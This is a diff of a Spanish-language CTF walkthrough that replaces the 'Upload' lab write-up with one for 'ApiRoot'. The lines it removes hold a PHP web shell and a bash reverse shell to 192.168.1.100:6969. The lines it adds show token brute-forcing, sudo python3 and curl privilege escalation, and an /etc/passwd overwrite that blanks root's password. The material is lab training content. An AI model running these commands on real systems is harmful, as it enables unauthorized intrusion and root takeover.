@@ -1,9 +1,9 @@
 
-# 2. Máquina: Upload  
+# 15. Máquina: ApiRoot  
 
 <a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-purple.svg?style=for-the-badge&logo=github"></a>
 
-**Dificultad:** *🟡* *Fácil*
+**Dificultad:** *🟡* *Medio*
 
 **Autor:** *[El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)*
 
@@ -119,6 +119,8 @@ Como se puede observar nos arroja una BadRequest, y probando con otros métodos 
 
 ![image](https://github.com/user-attachments/assets/5f23ace2-62d4-4c66-aeaf-56a0a3417fd9)
 
+### **Uso de la API**
+
 La página principal nos proporciona los ejemplos de uso de la API, la dirección `http://localhost:5000/api/directorio_oculto` es la más tentadora. Con `wfuzz` realizaremos un escaneo para averiguar si exixte un directorio oculto en la ruta `/api` del sitio
 ```python
 ~/ApiRoot ᐅ wfuzz -c --hc=404 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2:5000/api/FUZZ"
@@ -210,132 +212,107 @@ Trying token: chocolate
 Trying token: password1
 Success! Valid token found: password1
 ```
+Ahora si ejecutamos el mismo comando con el token obtenido, podemos ver que tenemos dos posibles usuarios para acceder por SSH.
+```python
+~/ApiRoot ᐅ curl -H "Authorization: Bearer password1" http://172.17.0.2:5000/api/users
+```
+**Salida:**
+
+```python
+[
+  {
+    "id": 1,
+    "nombre": "bob"
+  },
+  {
+    "id": 2,
+    "nombre": "dylan"
+  }
+]
+```
 
 ## Escalada de privilegios.
 
-En este caso, al tener acceso a la ruta en la que se alamacenan los archivos subidos, se puede intentar subir un archivo con extensión `.php`, el cual contendrá un script que permitirá la ejecución de una reverse shell.
+Si probamos a acceder con el usuario `bob` y la contraseña encontrada anteriormente. Vemos que accedemos con éxito a la máquina.
 
-El archivo que se subirá tendrá el nombre: reverse.php
+Dentro de la máquina buscamos formas de escalar privilegios, y encontramos que podemos realizar la ejecución de `python3` como el usuario `balulero`.
+```python
+Matching Defaults entries for bob on 7f87cca6ee8d:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
-### **Explicación de reverse.php**
-```php
-<?php
-        system($_GET['rev']);
-?>
-
+User bob may run the following commands on 7f87cca6ee8d:
+    (balulero) NOPASSWD: /usr/bin/python3
 ```
-
-- `<?php ... ?> ` :  Esto indica el inicio y el fin de un bloque de código.
-- `system($_GET['rev']);` :  En esta línea ocurre la operación principal.
-- `system()` :  Esta funcón ejecuta un comando directamente del sistema operativo y muestra la salida.
-- `$_GET['rev']` :  $_GET es un array superglobal que recoge los datos enviados a través de la consulta de la URL (`?rev=comando`) usando el método GET. En este caso, está buscando un parámetro llamado `rev`. 
-
-Antes de ponerlo a prueba, es necesario subir el script a el servidor.
-  
- ![image](https://github.com/user-attachments/assets/d69ce36a-c297-452e-85de-ae09e618eb3a)
-
-### **Ejemplo de uso de reverse.php**
-
-**http://172.17.0.2/uploads/reverse.php?rev=whoami**
-
-- `http://172.17.0.2/uploads/reverse.php`: Esta parte especifica la ubicación del archivo `reverse.php` en el servidor.
-- `?rev=whoami`: Esto pasa el valor "whoami" a la variable `$_GET['rev']` en el archivo PHP. Este valor es el comando de linux que nos permite saber el nombre del usuario actual, si el funcionamiento del script es correcto, motrará un texto similar a `www-data` en el navegador, como se muestra en la imagen de abajo.
-
-![image](https://github.com/user-attachments/assets/68eead14-ecc8-49c8-95e9-1cceb69883ea)
-
-### **Ejecución de la reverse shell**
-
-`http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"`
-
-- `bash -c`: Ejecuta el siguiente comando en una nueva instancia de bash. Esto permite aislar la ejecución del comando del entorno actual.
-- `bash -i` :Ejecuta bash en modo interactivo. Esto crea una nueva sesión de shell interactiva, permitiendo al usuario ingresar comandos.
-- `>%26`: Redirige tanto la salida estándar (stdout) como la entrada estándar de error (stderr) al dispositivo especificado.
-- `/dev/tcp/192.168.1.100/6969`: Es un "archivo" especial en sistemas Linux que establece una conexión TCP a la dirección IP 192.168.1.100 en el puerto 6969. Toda la salida y los errores se envían a esta conexión. La IP cambiará en cada dispositivo, se puede comprobar con el comando `ifconfig` o `ip addr`.
-- `0>%261`: Redirige la entrada estándar (stdin) de la shell a la misma conexión TCP. Esto permite una comunicación interactiva a través de la conexión de red.
-
-#### Proceso:
-
-- **Fase de Preparación**: El atacante inicia un listener en su máquina en el puerto 6969 utilizando el comando `nc -lvnp 6969` de la herramienta Netcat. Esto prepara la máquina atacante para recibir la conexión de la reverse shell.
-  - `nc`: Esta es la abreviatura de "netcat", que se utiliza para leer y escribir datos a través de conexiones de red. 
-  - `-l`: Indica a netcat que debe entrar en modo escucha, es decir, esperará conexiones entrantes en el puerto que se deseé.
-  - `-v`: Activa el modo detallado. Muestra información adicional sobre la conexión, como la dirección IP y el puerto del cliente que se conecte.
-  - `-n`: Evita la resolución de nombres de dominio. En lugar de intentar resolver el nombre de dominio asociado a una dirección IP, se utiliza directamente la dirección IP.
-  - `-p 6969`: Esta opción especifica el número del puerto que se pondrá en escucha. 
+Si ejecutamos el siguente como el usuario `balulero`, obtenemos un avance. 
 
 ```python
-~/Upload ᐅ nc -lvnp 6969
-listening on [any] 6969 ...
+sudo -u balulero python3 -c 'import os; os.system("/bin/sh")'
 ```
 
-- **Ejecución**: Al acceder a la URL `http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"`, el archivo `reverse.php` ejecuta el comando enviado a través del parámetro `rev`. Este comando inicia una conexión desde la máquina víctima a la máquina atacante.
+Una vez dentro podemos darle un mejor aspecto a la shell con `script /dev/null -c bash`. Como siguiente paso, realizamos el mismo proceso de buscar cómo escalar privilegios. Y como se puede observar, se puede hacer uso de `cURL` como si fueramos `root`
 ```python
-listening on [any] 6969 ...
-connect to [192.168.1.100] from (UNKNOWN) [172.17.0.2] 41906
-bash: cannot set terminal process group (25): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@c925d2eea10b:/var/www/html/uploads$
+Matching Defaults entries for balulero on 7f87cca6ee8d:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User balulero may run the following commands on 7f87cca6ee8d:
+    (ALL) NOPASSWD: /usr/bin/curl
 ```
 
-- **Resultado**: Una vez ejecutado el comando, la máquina víctima establece una conexión con la máquina atacante, permitiendo al atacante obtener una shell interactiva con el usuario `www-data`.
+### **Acceso a root**
+En la ruta `/tmp`, copiaremos el contenido del archivo `/etc/passwd` a un archivo con el mismo nombre. Realizaremos una modificación al contenido para eliminar la contraseña del root. El archvio `/tmp/passwd` quedará de la siguiente forma: 
+
 ```python
-www-data@c925d2eea10b:/var/www/html/uploads$ whoami
-whoami
-www-data
+root::0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+balulero:x:1000:1000:balulero,,,:/home/balulero:/bin/bash
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
 ```
 
-### **Acceso root**
-#### Enumeración de Privilegios Sudo
+La línea `root::0:0:root:/root:/bin/bash` en el archivo `/tmp/passwd` y describe la cuenta del usuario root en un sistema Unix/Linux.
+- `root` Nombre de usuario.
+- `::` Campo de contraseña vacío, lo que significa que no hay contraseña para el usuario root. Esto es un riesgo de seguridad, ya que cualquiera puede acceder a la cuenta sin autenticación.
+- `0:0` UID y GID del usuario root.
+- `/root` Directorio home del root.
+- `/bin/bash` Shell por defecto.
+
+Finalmente, ejecutando el comando curl como sudo, podemos cambiar el contenido de `/etc/passwd` para elminar la contraseña del root.
 ```python
-www-data@c925d2eea10b:/var/www/html/uploads$ sudo -l
- ```
-
-Este comando muestra que el usuario `www-data` tiene permisos para ejecutar `env` con privilegios de superusuario.
-
-**Salida:**
-
+sudo curl file:///tmp/passwd -o /etc/passwd
+```
+La siguiente salida nos indica que se realizó de forma exitosa.
 ```python
-sudo -l
-Matching Defaults entries for www-data on c925d2eea10b:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
-
-User www-data may run the following commands on c925d2eea10b:
-    (root) NOPASSWD: /usr/bin/env
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1187  100  1187    0     0  10.8M      0 --:--:-- --:--:-- --:--:-- 10.8M
 ```
 
-#### Búsqueda de técnicas de escalada de privilegios con <a href="https://github.com/r1vs3c/searchbins">Searchbins</a>
-
-```python
-~/Upload ᐅ searchbins -b env -f sudo
-```
-
-Searchbins sugiere la técnica que se muestra en la salida para escalar privilegios utilizando `env` cuando se puede ejecutar como superusuario.
-
-**Salida:**
-```python
-
-[+] Binary: env
-
-================================================================================
-[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/env/#sudo]
-
-        | sudo env /bin/sh
-```
-
-#### Ejecución de la Escalada de Privilegios
-
-```python
-www-data@c925d2eea10b:/var/www/html/uploads$ sudo env /bin/sh
-```
-
-Este comando utiliza `env` con privilegios de superusuario para ejecutar un shell con permisos de root.
+Finalmente, si ejecutamos el comando `su`, por sí solo nos permitirá acceder al root.
 
 **Comprobación:**
 ```python
-sudo env /bin/sh
-whoami
-root
+balulero@7f87cca6ee8d:/tmp$ su
+root@7f87cca6ee8d:/tmp# whoami
+root  
 ```
 
 
